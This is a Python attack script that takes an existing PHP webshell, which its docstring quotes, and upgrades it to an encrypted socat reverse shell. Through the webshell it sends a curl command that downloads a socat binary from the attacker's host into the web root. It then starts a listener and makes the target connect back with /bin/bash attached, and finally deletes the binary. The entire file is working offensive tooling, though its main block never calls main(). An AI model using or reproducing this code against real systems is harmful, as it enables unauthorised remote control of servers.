#!/usr/bin/env python3

'''
    Shared by @b.strawberry.
    
    Upgrades php webshell to fully encrypted socat's reverse shell
    
    Expects the fallowing  webshell
    '<?php echo shell_exec($_GET["cmd"]); ?>'
    
    Usage: cozyshell --url http://xxx.xxx.xxx.xx/webshell.php \
	    --lhost xxx.xxx.xxx.xx \
	    --lport xxxx
'''

from requests import get
from uuid import uuid4
from argparse import ArgumentParser
from sys import exit 
from subprocess import Popen, run, check_output, DEVNULL
from shlex import split as sh_split
import urllib
from time import sleep


def start_web_server(dir='web'):
	print('[*] Starting Webserver')
	cmd = f'/usr/bin/python3 -m http.server -d {dir}'
	Popen(sh_split(cmd))

def stop_web_server():
	print('[*] Killing Webserver process')
	cmd = f'/usr/bin/fuser -f -k 8000/tcp'
	run(sh_split(cmd), stdout=DEVNULL, stderr=DEVNULL)

def upload_bin(webshell, lhost, http_port=8000):
    payload = str(uuid4()).split('-')[0]
    print(f'[*] Uploading socat binary to /var/www/html/{payload}')
    cmd = f'curl http://{lhost}:{http_port}/bin -o /var/www/html/{payload}'
    encoded_cmd = urllib.parse.quote(cmd, safe="")
    start_web_server()
    sleep(3)
    try:
        res = get(f'{webshell}?cmd={encoded_cmd}', verify=False)
    except:
        stop_web_server()
        return None
    if res.status_code == 200:
        print(f'[*] Finished uploading socat!')
    stop_web_server()
    return payload

def pop_handler(lport, cert='cert/shell.pem'):
    terminal =  check_output('tty').decode('utf-8').rstrip()
    print(f'[*] Starting reverse shell handler on tty {terminal}')
    print(f'[*] Paste CMD: export TERM=screen; stty rows 59 cols 116')
    cmd = f'socat OPENSSL-LISTEN:{lport},cert={cert},verify=0 FILE:{terminal},raw,echo=0'
    Popen(sh_split(cmd))

def get_reverse_shell(webshell, lhost, lport, payload):
    # Sometimes /tmp is mounted as no_exec. It's safer to execute payload on the web root
    payload_path = f'/var/www/html/{payload}'
    print(f'[*] Sending encrypted reverse shell to {lhost}:{lport}')
    cmd = f'chmod 777 {payload_path} &&'
    cmd = f'{cmd} {payload_path} OPENSSL:{lhost}:{lport},verify=0 EXEC:/bin/bash,pty,stderr,sigint,setsid,sane;'
    cmd = f'{cmd} rm -f {payload_path}'
    encoded_cmd = urllib.parse.quote(cmd, safe="")
    try:
        res = get(f'{webshell}?cmd={encoded_cmd}', verify=False)
    except:
        return 'Finished with errors'
    if res.status_code == 200:
        print(f'[*] Finished executing interactive shell')
    return 'Success'
    
def main(webshell, lhost):
    payload = upload_bin(webshell, lhost)
    if payload is None:
        print('[*] - Err: Could not upload payload to target\'s /tmp')
    pop_handler(lport)
    msg = get_reverse_shell(webshell, lhost, lport, payload)
    print(f'[*] {msg}')   
 

if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument('--url', type=str, required=True)
    parser.add_argument('--lhost', type=str, required=True)
    parser.add_argument('--lport', type=int, required=True)
    args = parser.parse_args()
    webshell  = args.url.strip()
    lhost = args.lhost.strip().lower()
    lport = args.lport

